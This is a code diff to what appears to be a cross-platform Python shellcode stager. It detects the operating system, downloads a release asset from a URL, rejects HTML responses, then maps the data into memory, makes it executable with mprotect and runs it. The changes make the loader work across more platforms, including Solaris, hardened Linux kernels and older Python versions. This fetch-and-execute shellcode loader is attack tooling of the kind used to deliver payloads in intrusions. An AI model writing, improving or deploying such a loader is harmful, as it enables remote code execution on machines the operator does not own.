@@ -108,7 +108,7 @@ def _detect_os():
         try:
             with open('/system/build.prop'):
                 return 'android'
-        except OSError:
+        except (OSError, IOError):
             pass
     if os_name == 'darwin':
         if os.path.isdir('/var/mobile') or os.path.exists('/usr/lib/libMobileGestalt.dylib'):
@@ -141,9 +141,10 @@ def get_host():
 def _ssl_context():
     """Return an SSL context, falling back to unverified if CA certs are unavailable.
 
-    Returns None on Python 2 where urllib2 does not accept a context argument.
+    Returns None on Python < 2.7.9 where urllib2 does not accept a context argument.
     """
-    if not _PY3:
+    # ssl.create_default_context was added in Python 2.7.9 / 3.4
+    if not hasattr(ssl, 'create_default_context'):
         return None
     try:
         ctx = ssl.create_default_context()
@@ -186,11 +187,20 @@ def download(platform_name, arch, tag):
     print("[*] Downloading: %s" % asset)
     print("[*] URL: %s" % url)
     try:
-        return _http_get(url)
+        data = _http_get(url)
     except HTTPError as e:
         if e.code == 404:
             sys.exit("[-] Asset '%s' not found in release %s.\n    URL: %s" % (asset, tag, url))
         raise
+
+    # Validate: reject obviously wrong payloads before executing as shellcode
+    if len(data) < 64:
+        sys.exit("[-] Downloaded data too small (%d bytes) - not valid shellcode" % len(data))
+    header = data[:256]
+    if b'<!DOCTYPE' in header or b'<html' in header or b'<HTML' in header:
+        sys.exit("[-] Downloaded data is HTML, not shellcode (check network/proxy)")
+
+    return data
 
 
 # =============================================================================
@@ -210,21 +220,31 @@ def _flush_icache(addr, size):
         libc.sys_icache_invalidate(ctypes.c_void_p(addr), ctypes.c_size_t(size))
 
 
+_PROT_READ = getattr(mmap, 'PROT_READ', 0x01)
+_PROT_WRITE = getattr(mmap, 'PROT_WRITE', 0x02)
+_PROT_EXEC = getattr(mmap, 'PROT_EXEC', 0x04)
+_MAP_PRIVATE = getattr(mmap, 'MAP_PRIVATE', 0x02)
+
+
 def run_mmap(shellcode):
     """Map shellcode RW, flip to RX via mprotect, execute."""
-    mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE)
+    size = len(shellcode)
+
+    # MAP_PRIVATE is required — the default MAP_SHARED causes mprotect to
+    # silently refuse PROT_EXEC on Solaris (and some hardened Linux kernels).
+    mem = mmap.mmap(-1, size, flags=_MAP_PRIVATE, prot=_PROT_READ | _PROT_WRITE)
     mem.write(shellcode)
     addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
 
-    libc = ctypes.CDLL(None)
+    libc = ctypes.CDLL(None, use_errno=True)
     page_size = os.sysconf('SC_PAGE_SIZE')
     aligned = addr & ~(page_size - 1)
-    total = len(shellcode) + (addr - aligned)
+    total = size + (addr - aligned)
     if libc.mprotect(ctypes.c_void_p(aligned), ctypes.c_size_t(total),
-                     mmap.PROT_READ | mmap.PROT_EXEC) != 0:
-        raise OSError("mprotect failed")
+                     _PROT_READ | _PROT_EXEC) != 0:
+        raise OSError("mprotect failed (errno=%d)" % ctypes.get_errno())
 
-    _flush_icache(addr, len(shellcode))
+    _flush_icache(addr, size)
 
     print("[+] Entry: 0x%x" % addr)
     print("[*] Executing...")
